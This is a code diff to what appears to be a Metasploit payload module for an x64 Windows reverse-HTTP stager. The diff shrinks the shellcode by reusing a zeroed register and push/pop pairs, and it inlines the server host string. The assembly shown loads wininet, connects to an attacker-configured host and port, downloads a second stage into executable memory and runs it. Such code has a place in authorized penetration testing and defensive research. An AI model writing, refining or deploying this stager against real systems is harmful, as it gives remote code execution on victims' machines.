@@ -198,18 +198,18 @@ module Payload::Windows::ReverseHttp_x64
     end
 
     asm = %Q^
+        xor rbx, rbx
       load_wininet:
-        push 0                        ; stack alignment
+        push rbx                      ; stack alignment
         mov r14, 'wininet'
         push r14                      ; Push 'wininet',0 onto the stack
-        mov r14, rsp                  ; Save pointer to string
-        mov rcx, r14                  ; the name of the lib to load
+        mov rcx, rsp                  ; lpFileName (stackpointer)
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp
 
       internetopen:
-        push 0                        ; stack alignment
-        push 0                        ; NULL pointer
+        push rbx                      ; stack alignment
+        push rbx                      ; NULL pointer
         mov rcx, rsp                  ; lpszAgent ("")
     ^
 
@@ -224,29 +224,30 @@ module Payload::Windows::ReverseHttp_x64
       ^
     else
       asm << %Q^
-        xor rdx, rdx                  ; dwAccessType (0=INTERNET_OPEN_TYPE_PRECONFIG)
+        push rbx
+        pop rdx                       ; dwAccessType (0=INTERNET_OPEN_TYPE_PRECONFIG)
         xor r8, r8                    ; lpszProxyName (NULL)
       ^
     end
 
     asm << %Q^
         xor r9, r9                    ; lpszProxyBypass (NULL)
-        push rax                      ; stack alignment
-        push 0                        ; dwFlags (0)
+        push rbx                      ; stack alignment
+        push rbx                       ; dwFlags (0)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call rbp
 
-        jmp dbl_get_server_host
-
-      internetconnect:
+        call load_server_host
+        db "#{opts[:host]}",0x0
+      load_server_host:
         pop rdx                       ; lpszServerName
         mov rcx, rax                  ; hInternet
         mov r8, #{opts[:port]}        ; nServerPort
         xor r9, r9                    ; lpszUsername (NULL)
-        push r9                       ; dwContent (0)
-        push r9                       ; dwFlags (0)
+        push rbx                      ; dwContent (0)
+        push rbx                      ; dwFlags (0)
         push 3                        ; dwService (3=INTERNET_SERVICE_HTTP)
-        push r9                       ; lpszPassword (NULL)
+        push rbx                      ; lpszPassword (NULL)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
         call rbp
     ^
@@ -299,14 +300,15 @@ module Payload::Windows::ReverseHttp_x64
 
       httpopenrequest:
         mov rcx, rax                  ; hConnect
-        xor rdx, rdx                  ; lpszVerb (NULL=GET)
+        push rbx
+        pop rdx                       ; lpszVerb (NULL=GET)
         pop r8                        ; lpszObjectName (URI)
         xor r9, r9                    ; lpszVersion (NULL)
-        push rdx                      ; dwContext (0)
+        push rbx                      ; dwContext (0)
         mov r10, #{"0x%.8x" % http_open_flags}  ; dwFlags
         push r10
-        push rdx                      ; lplpszAcceptType (NULL)
-        push rdx                      ; lpszReferer (NULL)
+        push rbx                      ; lplpszAcceptType (NULL)
+        push rbx                      ; lpszReferer (NULL)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
         call rbp
 
@@ -322,11 +324,13 @@ module Payload::Windows::ReverseHttp_x64
       asm << %Q^
       internetsetoption:
         mov rcx, rsi                  ; hInternet (request handle)
-        mov rdx, 31                   ; dwOption (31=INTERNET_OPTION_SECURITY_FLAG)
-        push 0                        ; stack alignment
+        push 31
+        pop rdx                       ; dwOption (31=INTERNET_OPTION_SECURITY_FLAG)
+        push rdx                      ; stack alignment
         push #{"0x%.8x" % set_option_flags}  ; flags
         mov r8, rsp                   ; lpBuffer (pointer to flags)
-        mov r9, 4                     ; dwBufferLength (4 = size of flags)
+        push 4
+        pop r9                        ; dwBufferLength (4 = size of flags)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
       ^
@@ -335,11 +339,12 @@ module Payload::Windows::ReverseHttp_x64
     asm << %Q^
       httpsendrequest:
         mov rcx, rsi                  ; hRequest (request handle)
-        xor rdx, rdx                  ; lpszHeaders (NULL)
+        push rbx
+        pop rdx                       ; lpszHeaders (NULL)
         xor r8, r8                    ; dwHeadersLen (0)
         xor r9, r9                    ; lpszVersion (NULL)
-        push rdx                      ; stack alignment
-        push rdx                      ; dwOptionalLength (0)
+        push rbx                      ; stack alignment
+        push rbx                      ; dwOptionalLength (0)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call rbp
         test eax, eax
@@ -349,9 +354,6 @@ module Payload::Windows::ReverseHttp_x64
         dec rdi
         jz failure
         jmp retryrequest
-
-      dbl_get_server_host:
-        jmp get_server_host
 
       get_server_uri:
         call httpopenrequest
@@ -368,7 +370,7 @@ module Payload::Windows::ReverseHttp_x64
     else
       asm << %Q^
       failure:
-        push 0                        ; stack alignment
+        push rbx                      ; stack alignment
         push 0x56A2B5F0               ; hardcoded to exitprocess for size
         call rbp
       ^
@@ -376,10 +378,13 @@ module Payload::Windows::ReverseHttp_x64
 
     asm << %Q^
       allocate_memory:
-        xor rcx, rcx                  ; lpAddress (NULL)
-        mov rdx, 0x00400000           ; dwSize (4 MB)
+        push rbx
+        pop rcx                       ; lpAddress (NULL)
+        push 0x40
+        pop rdx
+        mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
+        shl edx, 16                   ; dwSize
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
-        mov r9, 0x40                  ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp
 
@@ -404,20 +409,13 @@ module Payload::Windows::ReverseHttp_x64
         mov ax, word ptr [rdi]        ; extract the read byte count
         add rbx, rax                  ; buffer += bytes read
 
-        test rax, rax                 ; are we done?
+        test eax, eax                 ; are we done?
         jnz download_more             ; keep going
         pop rax                       ; clear up reserved space
         pop rax                       ; realign again
 
       execute_stage:
         ret                           ; return to the stored stage address
-
-      get_server_host:
-        call internetconnect
-
-      server_host:
-        db "#{opts[:host]}",0x0
-
     ^
 
     if opts[:exitfunk]
